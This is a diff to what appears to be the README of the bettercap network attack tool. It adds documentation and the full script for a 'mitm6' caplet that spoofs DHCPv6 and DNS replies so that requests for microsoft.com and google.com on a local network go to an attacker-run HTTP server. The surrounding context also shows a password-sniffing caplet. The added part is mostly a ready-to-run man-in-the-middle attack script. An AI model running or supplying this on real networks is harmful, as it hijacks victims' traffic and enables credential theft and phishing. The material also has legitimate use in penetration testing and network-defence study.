@@ -59,6 +59,35 @@ set net.sniff.output passwords.pcap
 net.sniff on
 ```
 
+#### caplets/mitm6.cap
+
+Reroute DNS requests by using DHCPv6 replies, start a HTTP server and DNS spoofer for `microsoft.com` and `google.com`.
+
+```sh
+# let's spoof Microsoft and Google ^_^
+set dns.spoof.domains microsoft.com, google.com
+set dhcp6.spoof.domains microsoft.com, google.com
+
+# every request http request to the spoofed hosts will come to us
+# let's give em some contents
+set http.server.path caplets/www
+
+# check who's alive on the network
+net.recon on
+# serve files
+http.server on
+# redirect DNS request by spoofing DHCPv6 packets
+dhcp6.spoof on
+# send spoofed DNS replies ^_^
+dns.spoof on
+
+# set a custom prompt for ipv6
+set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
+# clear the events buffer and the screen
+events.clear
+clear
+```
+
 #### caplets/rest-api.cap
 
 Start a rest API.
